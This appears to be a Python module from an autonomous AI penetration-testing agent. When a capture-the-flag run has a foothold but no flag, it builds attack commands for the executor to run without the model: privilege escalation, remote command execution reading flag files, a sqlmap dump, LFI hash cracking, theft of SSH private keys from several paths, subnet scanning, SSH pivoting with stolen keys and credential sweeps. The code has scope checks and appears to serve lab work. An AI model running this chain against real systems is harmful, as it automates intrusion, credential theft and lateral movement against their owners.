"""Deterministic auto-closer — the reliability backstop that makes 6/6 consistent.

The model is stochastic: even with the brain injecting the right play, it sometimes declares 'done'
without the flag or burns the budget without ever running the proven helper (T5 was the repeat
offender). The closer removes the model from the last mile: when grin has a foothold but NO flag, the
EXECUTOR itself runs the matching deterministic helper through the spine (authorized, in-scope) — no
model in the loop. This is what the Medic should have been doing.

Pure here: extract the web foothold (url/param/method/mode) from the run history, and build the
ordered list of deterministic closer commands. The executor submits them via the spine."""
from __future__ import annotations

import re

# common injectable param names, tried when we can't extract the exact one from history
_PARAM_CANDIDATES = ["name", "host", "q", "id", "file", "search", "url", "cmd"]


def _mode_from(history: str) -> str:
    low = history.lower()
    if "ssti" in low or "{{" in history or "jinja" in low or "--mode ssti" in low:
        return "ssti"
    if "uid=" in low or "cmdi" in low or "command injection" in low or ";id" in low:
        return "cmdi"
    return "auto"


def _method_from(history: str) -> str:
    return "POST" if ("--method POST" in history or re.search(r"\bcurl\b[^\n]*\s-d\s", history)) \
        else "GET"


def extract_web_foothold(history: str, target: str) -> dict | None:
    """Pull {url, param, method, mode} for a web foothold out of the run history, or None if there's
    no web signal at all. Prefers an explicit `--url/--param` (from a helper the model already ran),
    then a curl query/post param."""
    h = history or ""
    url = param = None

    m = re.search(r"--url\s+(\S+)", h)
    if m:
        url = m.group(1).strip("'\"")
    m = re.search(r"--param\s+(\S+)", h)
    if m:
        param = m.group(1).strip("'\"")

    if param is None:
        m = re.search(r"[?&]([A-Za-z0-9_]+)=", h)          # ?name=  / &host=
        if m:
            param = m.group(1)
    if param is None:
        m = re.search(r"-d\s+['\"]?([A-Za-z0-9_]+)=", h)    # curl -d 'host=...'
        if m:
            param = m.group(1)

    if url is None:
        # only accept a URL whose host is the in-scope TARGET — never a URL leaked in a tool banner
        # (e.g. nmap prints "https://nmap.org"); attacking that would be out of scope.
        for cand in re.findall(r"https?://[^\s'\"]+", h):
            cand = cand.split("?", 1)[0]
            if target and target in cand:
                url = cand
                break

    # a URL we DID find (e.g. from --url) must still be the in-scope target, else discard it
    if url is not None and target and target not in url:
        url = None

    # require SOME web signal tied to this engagement
    has_web = url is not None or param is not None or "http" in h.lower()
    if not has_web:
        return None
    if url is None:
        url = f"http://{target}/"
    if param is None:
        param = "name"
    return {"url": url, "param": param, "method": _method_from(h), "mode": _mode_from(h)}


def _discovered_pivot_host(history: str, target: str) -> str | None:
    """A CANDIDATE pivot host (an IP other than the entry target) seen in the history. Not itself
    scope-filtered: every closer command is re-submitted through the spine, which authorizes the
    target and rejects anything out of scope — so an out-of-scope IP surfaced here is dropped there,
    never executed."""
    for ip in re.findall(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", history or ""):
        if ip != target and not ip.startswith("127."):
            return ip
    return None


def _readme_clue(history: str) -> str:
    m = re.search(r"(deploy key[^\n]*|service account[^\n]*|for the \w+ account[^\n]*)",
                  history or "", re.I)
    return m.group(1)[:120] if m else ""


def closer_commands(history: str, target: str) -> list[str]:
    """Ordered deterministic helper commands to capture the flag, given the foothold in `history`.
    Empty if there's nothing to act on."""
    h = history or ""
    low = h.lower()
    cmds: list[str] = []

    # SSH pivot: a stolen key + a discovered other host -> ssh-loot
    if ("begin openssh private key" in low or "begin rsa private key" in low
            or "/tmp/loot/id_rsa" in low):
        host = _discovered_pivot_host(h, target)
        if host:
            readme = _readme_clue(h)
            r = f" --readme '{readme}'" if readme else ""
            cmds.append(f"ssh-loot --host {host} --key /tmp/loot/id_rsa{r}")

    # Web foothold -> try both privesc closers + a direct read + a SQLi dump
    fh = extract_web_foothold(h, target)
    if fh:
        u, p, meth, mode = fh["url"], fh["param"], fh["method"], fh["mode"]
        cmds.append(f"suid-hijack --url {u} --param {p} --mode {mode} --flag /root/flag.txt")
        cmds.append(f"sudo-gtfo --url {u} --param {p} --method {meth} --mode {mode} "
                    f"--flag /root/flag.txt")
        # Direct read of the proof — try the standard flag locations, not just /root (a flag commonly
        # sits at /flag.txt, the current user's home, or another user's home), so the extractor catches
        # it wherever it is. Any GRIN{...}/sensitive content in the output is captured.
        cmds.append(f"web-rce --url {u} --param {p} --method {meth} --mode {mode} "
                    f"--cmd 'cat /flag.txt /root/flag.txt ~/flag.txt 2>/dev/null; "
                    f"cat /home/*/flag.txt 2>/dev/null'")
        # SQLi: deterministically test+dump the parameter with sqlmap (--batch = non-interactive).
        # Dumped creds/hashes/flags are caught by the extractors; --threads for speed, capped risk.
        _q = u if "?" in u else f"{u}?{p}=1"
        _data = f" --data '{p}=1'" if meth == "POST" else ""
        cmds.append(f"sqlmap -u '{_q}' -p {p}{_data} --batch --dump --flush-session "
                    f"--level 2 --risk 1 --threads 4")
        # LFI/path-traversal -> offline crack -> SSH: read a world-readable hash backup through the
        # param, crack it (john+rockyou), SSH in and read the loot — all deterministic.
        cmds.append(f"lfi-crack --url {u} --param {p} --target {target}")
        # PIVOT enabling: web foothold but no key yet -> exfiltrate likely deploy/SSH keys through it
        # (extractor auto-persists to /tmp/loot/id_rsa) and scan the /24, so a 2nd pass can ssh-loot.
        if "begin openssh private key" not in low and "/tmp/loot/id_rsa" not in low:
            for kp in ("/opt/deploy/id_rsa", "/root/.ssh/id_rsa", "/home/*/.ssh/id_rsa",
                       "/opt/*/id_rsa", "/var/lib/*/.ssh/id_rsa"):
                cmds.append(f"web-rce --url {u} --param {p} --method {meth} --mode {mode} "
                            f"--cmd 'cat {kp} 2>/dev/null; cat /opt/deploy/README 2>/dev/null'")
            sub = _subnet24(target)
            if sub:
                cmds.append(f"nmap -sn {sub}")

    # Cross-objective pivot: when this objective targets a bare host (no web foothold of its own) and
    # an SSH key was captured in an EARLIER objective (it persists at /tmp/loot/id_rsa on the runner),
    # try ssh-loot against this host — the lateral move where the key and the flag live on different
    # hosts/objectives. ssh-loot no-ops gracefully if the key file isn't there.
    if fh is None and re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", target or ""):
        readme = _readme_clue(h)
        r = f" --readme '{readme}'" if readme else ""
        cmds.append(f"ssh-loot --host {target} --key /tmp/loot/id_rsa{r}")

    # Default-credential sweep when an SSH service is indicated (bounded, online-safe).
    if "22/tcp" in low or "open ssh" in low or "ssh://" in low or "port 22" in low:
        cmds.append(f"cred-sweep --target {target}")
    # SMB: enumerate anonymous shares (best-effort breadth — files there often hold creds/configs).
    if "445/tcp" in low or "139/tcp" in low or "microsoft-ds" in low or "netbios" in low:
        cmds.append(f"smbclient -L //{target} -N")
    return cmds


def _subnet24(target: str) -> str | None:
    m = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$", target or "")
    return f"{m.group(1)}.0/24" if m else None


def command_target(cmd: str, default: str) -> str:
    """The TRUE destination host a closer command will hit — so _closer_pass can submit it through the
    spine with THAT as the target and the spine's scope check applies to the real destination (not
    just the engagement target). This is what stops an out-of-scope host/URL embedded in a command."""
    import urllib.parse
    m = re.search(r"--host\s+(\S+)", cmd) or re.search(r"--target\s+(\S+)", cmd)
    if m:
        return m.group(1).strip("'\"")
    m = re.search(r"--url\s+(\S+)", cmd)
    if m:
        host = urllib.parse.urlsplit(m.group(1).strip("'\"")).hostname
        if host:
            return host
    # sqlmap -u 'http://h/...' / a bare URL in the command
    m = re.search(r"https?://([^/\s'\"]+)", cmd)
    if m:
        return m.group(1)
    return default
